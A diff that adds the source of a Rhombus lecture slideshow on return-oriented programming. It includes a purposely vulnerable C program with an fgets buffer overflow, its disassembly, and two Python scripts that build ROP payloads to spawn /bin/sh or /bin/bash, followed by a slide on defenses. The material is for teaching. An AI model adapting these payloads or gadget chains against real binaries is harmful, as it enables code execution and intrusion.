@@ -1,0 +1,463 @@
+#lang rhombus/static/and_meta
+
+import:
+  rhombus/runtime_path
+  "common.rhm" open
+  "proc_call.rkt":
+    expose:
+      #{code-on-stack-picts}
+      #{example-rop-stack}
+      #{example-rop2-stack}
+
+slide(~title: "Buffer Overflow Redux",
+      slide.align(
+        para(@{The goal of a buffer overflow attack is to run code different},
+             @{than intended by the program author}),
+        blank(),
+        para(@{If the attacker wants to run an existing function, then a},
+             @{simple buffer overflow attack may suffice}),
+        blank(),
+        para(@{What if the program does not already have the right code?})
+      ))
+
+slide(~title: "Code on Stack",
+      block:
+        let PairList[h, ...] = #{code-on-stack-picts}()
+        slide.alts(Pict.from_handle(h), ...))
+
+slide(~title: "Return-Oriented Programming",
+      slide.align(
+        para(@{@defterm{Return-oriented programming (ROP)} is an attack technique},
+             @{that uses a program's existing machine code}),
+        slide.next,
+        blank(),
+        para(@{Machine-code @defterm{gadgets} are combined to do things that were not in the original source code!})
+      ))
+
+def bug = @tt{fgets(name, 256, f);}
+def bin_date = @tt{"/bin/date"}
+
+def hello_c:
+  @verbatim|{
+#include <unistd.h>
+#include <stdio.h>
+
+void say_hello() {
+  char name[10];
+  FILE *f = fopen("name", "rb");
+  |@bug
+  fclose(f);
+  printf("hello %s\n", name);
+}
+
+char *get_shell_path() {
+  return "/bin/sh";
+}
+
+void show_date() {
+  extern char** environ;
+  char *bin_date = |@bin_date;
+  char *argv[2] = {bin_date, NULL};
+  execve(bin_date, argv, environ);
+}
+
+int main(int argc, char **argv) {
+  say_hello();
+  show_date();
+  return 0;
+}
+}|
+
+def broken_title = "Another Broken Program"
+def broken_program = hello_c.scale(0.5)
+def broken_program_bug:
+  balloon.pin(~on: broken_program,
+              ~at: Find.right(bug),
+              ~spike: #'w,
+              ~dx: -64,
+              @para{buffer overflow bug})
+
+
+slide(~title: broken_title,
+      slide.alts(broken_program,
+                 broken_program_bug))
+
+def buffer_pip: @tt{ }
+
+def say_hello_asm:
+  @verbatim|{
+_say_hello:
+0000000100003e60	subq	$0x18, %rsp
+0000000100003e64	leaq	0xd9(%rip), %rdi   # "name"
+0000000100003e6b	leaq	0xd7(%rip), %rsi   # "rb"
+0000000100003e72	callq	0x100003f38        # _fopen
+0000000100003e77	movq	%rax, (%rsp)
+0000000100003e7b	leaq	0xe(%rsp), %rdi|@buffer_pip
+0000000100003e80	movq	(%rsp), %rdx
+0000000100003e84	movl	$0x100, %esi
+0000000100003e89	callq	0x100003f32        # _fgets
+0000000100003e8e	movq	(%rsp), %rdi
+0000000100003e92	callq	0x100003f2c        # _fclose
+0000000100003e97	leaq	0xe(%rsp), %rsi
+0000000100003e9c	leaq	0xa9(%rip), %rdi   # "hello %s\n"
+0000000100003ea3	movb	$0x0, %al
+0000000100003ea5	callq	0x100003f3e        # _printf
+0000000100003eaa	addq	$0x18, %rsp
+0000000100003eae	retq
+0000000100003eaf	nop
+}|
+
+slide(~title: @titlely{Disassembly of @tt{say_hello}},
+      block:
+        let p = say_hello_asm.scale(0.7)
+        slide.alts(
+          p,
+          balloon.pin(~on: p,
+                      ~at: Find.left(buffer_pip),
+                      ~spike: #'w,
+                      ~dx: -64,
+                      @para{@tt{0x18-0xe} is 10})
+        ))
+
+slide(~title: broken_title,
+      balloon.pin(~on: broken_program_bug,
+                  ~at: Find.right(bin_date),
+                  ~spike: #'w,
+                  ~dx: -64,
+                  lines(@para{but @tt{show_date} always},
+                        @para{runs @tt{/bin/date}})))
+
+def rax_pip = @tt{ }
+
+def show_date_asm:
+  @verbatim|{
+_show_date:
+0000000100003ec0	subq	$0x18, %rsp
+0000000100003ec4	leaq	0x93(%rip), %rax   # "/bin/date"
+0000000100003ecb	movq	%rax, 0x10(%rsp)|@rax_pip
+0000000100003ed0	movq	0x10(%rsp), %rax
+0000000100003ed5	movq	%rax, (%rsp)
+0000000100003ed9	movq	$0x0, 0x8(%rsp)
+0000000100003ee2	movq	0x10(%rsp), %rdi
+0000000100003ee7	movq	%rsp, %rsi
+0000000100003eea	movq	0x10f(%rip), %rax  # _environ
+0000000100003ef1	movq	(%rax), %rdx
+0000000100003ef4	callq	0x100003f26        # _execve
+0000000100003ef9	addq	$0x18, %rsp
+0000000100003efd	retq
+0000000100003efe	nop
+}|
+
+def get_shell_path_asm:
+  @verbatim|{
+_get_shell_path:
+0000000100003eb0	leaq	0x9f(%rip), %rax   # "/bin/sh"
+0000000100003eb7	retq
+}|
+
+slide(~title: @titlely{Disassembly of @tt{show_date}},
+      block:
+        let p = show_date_asm.scale(0.7)
+        slide.alts(p,
+                   balloon.pin(~on: p,
+                               ~at: Find.left(rax_pip),
+                               ~spike: #'nw,
+                               ~dy: 0,
+                               ~dx: -32,
+                               lines(@para{If only we could},
+                                     @para{get here, but with},
+                                     @para{@tt{"/bin/sh"} in RAX...}))))
+
+slide(~title: @titlely{Disassembly of @tt{get_shell_path}},      
+      get_shell_path_asm.scale(0.7),
+      slide.next,
+      blank(),
+      slide.align(
+        @para{Idea:}.pad(~left: -16),
+        @t{@bold{Exploit overflow:} make @tt{say_hello} return to @tt{get_shell_path}},
+        slide.right(@para{⇒ @tt{"/bin/sh"} in RAX}.colorize("blue")),
+        slide.next,
+        @t{@bold{Same overflow:} make @tt{get_shell_path} return to inside @tt{show_date}},
+        slide.right(@para{right after @tt{"/bin/date"} assumed in RAX}.colorize("blue"))
+      ))
+
+def get_shell_path_ret = boldly(@tt{0x0100003eb0})
+def inside_show_date_ret = boldly(@tt{0x0100003ecb})
+def mystery = boldly(@tt{??????})
+
+slide(~title: "Chaining Returns",
+      block:
+        let p:
+          Pict.from_handle(#{example-rop-stack}(~ret1: get_shell_path_ret.snapshot().handle,
+                                                ~ret2: inside_show_date_ret.snapshot().handle))
+        let p2:
+          balloon.pin(~on: p,
+                      ~at: Find.right(get_shell_path_ret),
+                      ~spike: #'nw,
+                      ~dy: 0,
+                      ~dx: -64,
+                      @tt{get_shell_path})
+        slide.alts(
+          p,
+          p2,
+          balloon.pin(~on: p2,
+                      ~at: Find.right(inside_show_date_ret),
+                      ~spike: #'sw,
+                      ~dy: 0,
+                      ~dx: -64,
+                      @para{inside @tt{show_date}})
+        ))
+
+def sh_exploit_py:
+  @verbatim|{
+import sys;
+
+# address of `get_shell_path`:
+get_shell_path = b"\xb0\x3e\x00\x00\x01\x00\x00\x00"
+
+# inside of `show_date` at the point where it expects
+# "/bin/date" to be in RAX:
+inside_show_date = b"\xcb\x3e\x00\x00\x01\x00\x00\x00"
+
+sys.stdout.buffer.write(b"a"*10
+                        + get_shell_path
+                        + inside_show_date)
+}|
+
+def exploit_title = "Constructing the Exploit"
+
+slide(~title: exploit_title,
+      sh_exploit_py)
+
+slide(~title: "Return Oriented Programming",
+      slide.align(
+        para(@{ROP means chaining a sequence of return addresses},
+             @{to construct a new program out of resident machine code}),
+        slide.next,
+        blank(),
+        @para{In the example, having @tt{get_shell_path} was @italic{awfully} convenient...},
+        blank(),
+        @para{Could we construct our own string?},
+        slide.next,
+        @para{Could we include a path in the exploit and refer to it?}
+      ))
+
+def chaining_more_title = "Chaining More Returns"
+
+slide(~title: chaining_more_title,
+      block:
+        let p:
+          Pict.from_handle(#{example-rop2-stack}(~rets: PairList[mystery.snapshot().handle],
+                                                 ~ret2: inside_show_date_ret.snapshot().handle))
+        let function:
+          @t{function}
+        let p2:
+          balloon.pin(~on: p,
+                      ~at: Find.right(mystery),
+                      ~spike: #'w,
+                      ~dy: 0,
+                      ~dx: -96,
+                      lines(@para{no @function is going to return},
+                            @para{a deeper stack position in RAX}))
+        slide.alts(
+          p,
+          p2,
+          balloon.pin(~on: p2,
+                      ~at: Find.top(function),
+                      ~spike: #'sw,
+                      ~fill: "lightgreen",
+                      lines(@para{but we don't have to call},
+                            @para{a whole function!}))
+        ))
+
+def fgets_end_asm_top:
+  @verbatim|{
+    0x7ff8131ff6f0 <+263>: movq   %rbx, %rax
+    0x7ff8131ff6f3 <+266>: addq   $0x18, %rsp
+  }|
+
+def fgets_end_asm_bottom:
+  @verbatim|{
+    0x7ff8131ff6f7 <+270>: popq   %rbx
+    0x7ff8131ff6f8 <+271>: popq   %r12
+    0x7ff8131ff6fa <+273>: popq   %r13
+    0x7ff8131ff6fc <+275>: popq   %r14
+    0x7ff8131ff6fe <+277>: popq   %r15
+    0x7ff8131ff700 <+279>: popq   %rbp
+    0x7ff8131ff701 <+280>: retq   
+  }|
+
+fun c_library_slide(options :~ OptMap) :~ OptMap:
+  fun label(p :~ Pict, on, side, q :~ Pict) :~ Pict:
+    cond
+    | !on: p
+    | ~else:
+        let brace = stack(~horiz: side,
+                          line(~dx: 10),
+                          line(~dy: p.height),
+                          line(~dx: 10)).colorize("blue")
+        let q = q.colorize("blue")
+        if side == #'right
+        | beside(~sep: 16, p, brace, q).refocus(p)
+        | beside(~sep: 16, q, brace, p).refocus(p)
+  slide(~title: "Using C Library Code",      
+        @para{C library functions can be a rich source of code fragments}.pad(~right: 96),
+        if options == {} | slide.next | nothing,
+        blank(),
+        slide.align(
+          @para{End of @tt{fgets}:}.pad(~left: -16),
+          label(stack(~horiz: #'left,
+                      fgets_end_asm_top.ghost(!options[#'top]),
+                      label(fgets_end_asm_bottom.pad(~right: 32),
+                            options[#'pop6],
+                            #'right,
+                            lines(@bold{Gadget 1:},
+                                  lines(@para{pops 6 words},
+                                        @para{from the stack},
+                                        @para{and puts them in},
+                                        @para{registers, starting},
+                                        @para{with RBX})
+                                    .pad(~left: 8)))),
+                options[#'pop9],
+                #'left,
+                lines(@bold{Gadget 2:},
+                      lines(@para{RBX → RAX},
+                            @para{then pops 9},
+                            @para{words from},
+                            @para{the stack})
+                        .pad(~left: 8)))
+        ))
+  options
+
+let options = c_library_slide({})
+let options = c_library_slide(options ++ { #'pop6 })
+let options = c_library_slide(options ++ { #'top })
+let options = c_library_slide(options ++ { #'pop9 })
+
+def gadget1_ret = boldly(@tt{0x7ff8131ff6f7})
+def gadget2_ret = boldly(@tt{0x7ff8131ff6f0})
+def stack_addr = boldly(@tt{0x030410b6ae})
+def any_addr = @italic{anything}
+def any_h = any_addr.snapshot().handle
+
+slide(~title: chaining_more_title,
+      block:
+        let p:
+          Pict.from_handle(#{example-rop2-stack}(~rets: PairList[gadget1_ret.snapshot().handle,
+                                                                 stack_addr.snapshot().handle,
+                                                                 any_h, any_h, any_h, any_h, any_h,
+                                                                 gadget2_ret.snapshot().handle,
+                                                                 any_h, any_h, any_h,
+                                                                 any_h, any_h, any_h,
+                                                                 any_h, any_h, any_h],
+                                                 ~ret2: inside_show_date_ret.snapshot().handle))
+        let p: p.scale(0.5)
+        let p1: balloon.pin(~on: p,
+                            ~at: Find.right(gadget1_ret),
+                            ~spike: #'w,
+                            ~dx: -96,
+                            @para{gadget 1})
+        let p2: balloon.pin(~on: p1,
+                            ~at: Find.left(stack_addr),
+                            ~spike: #'e,
+                            ~dx: 96,
+                            lines(@para{address of @tt{name}},
+                                  @para{on stack}))
+        let p3: balloon.pin(~on: p2,
+                            ~at: Find.right(gadget2_ret),
+                            ~spike: #'w,
+                            ~dx: -96,
+                            @para{gadget 2})
+        let p4: balloon.pin(~on: p3,
+                            ~at: Find.right(inside_show_date_ret),
+                            ~spike: #'w,
+                            ~dx: -96,
+                            @para{inside @tt{show_date}})
+        slide.alts(
+          p,
+          p1,
+          p2,
+          p3,
+          p4
+        ))
+
+def bash_exploit_py:
+  @verbatim|{
+import sys;
+
+# pops 6 words into regsiters, including RBX:
+pops = b"\xf7\xf6\x1f\x13\xf8\x7f\x00\x00"
+# move RBX into RAX, then pops 9 words:
+move_and_pops = b"\xf0\xf6\x1f\x13\xf8\x7f\x00\x00"
+
+# location where `name` ends up on the stack:
+buffer_on_stack = b"\xae\xb6\x10\x04\x03\x00\x00\x00"
+
+# inside of `show_date` at the point where it expects
+# "/bin/date" to be in RAX:
+inside_show_date = b"\xcb\x3e\x00\x00\x01\x00\x00\x00"
+
+sys.stdout.buffer.write(b"/bin/bash\x00"
+                        + pops
+                        + buffer_on_stack*6 # stack address into RBX
+                        + move_and_pops
+                        + buffer_on_stack*9 # stack address from RBX into RAX
+                        + inside_show_date)
+}|
+
+slide(~title: exploit_title,
+      bash_exploit_py.scale(0.6))
+
+slide(~title: "Finding and Using Gadgets",
+      slide.align(
+        @para{Finding gadgets and combining them is tricky and tedious},
+        blank(),
+        @para{Can be automated by tools:},
+        @item{gather gadgets},
+        @item{generate a compiler than uses the gadgets},
+        slide.next,
+        blank(32),
+        slide.alts(
+          [@para{x86 bonus:},
+           @item{instructions have varying lengths},
+           @item{@tt{ret} is @tt{0xC3}},
+           slide.right(@para{⇒ might find a @tt{0xC3} in the middle of an instruction}.colorize("blue"))],
+          [@para{Reducing gadget dependence:},
+           @item{Implement most of attack as direct machine code},
+           @item{Use gadgets only as needed to call @tt{mprotect}}]
+        )
+      ))
+
+slide(~title: "Defenses Against ROP",
+      slide.align(
+        @para{ASLR: makes finding gadgets and buffers much harder},
+        slide.next,
+        blank(),
+        stack.left(
+          ~sep: 8,          
+          @para{Compiler adjustments to reduce useful gadgets:},
+          @item{avoid @tt{0xC3} in non-return instruction encodings},
+          @item{add ``poison'' instructions before each return}
+        ),
+        slide.next,
+        blank(),
+        stack.left(
+          ~sep: 8,
+          para(@{@defterm{Control flow integrity (CFI)}: check target address},
+               @{before jumping}),
+          item(@{LLVM CFI option inserts checks and uses link-time optimization to build},
+               @{a map of valid target addresses}),
+          item(@{Intel @bold{Control-flow Enforcement Technology} keeps a shadow},
+               @{stack for calls and returns}),
+          item(@{Windows @bold{Control Flow Guard} keeps a per-process bitmap of valid},
+               @{return and jump addresses}),
+        )        
+      ))
+
+slide(~title: "Summary",
+      slide.align(
+        @para{@defterm{Return-oriented programming (ROP)} exploits a buffer overflow}.pad(~left: -16),
+        @para{to create a new program that's not in the original source},
+        @para{by chaining @defterm{gadgets}: existing machine-code fragments that end in @tt{ret} instructions}
+      ))
+
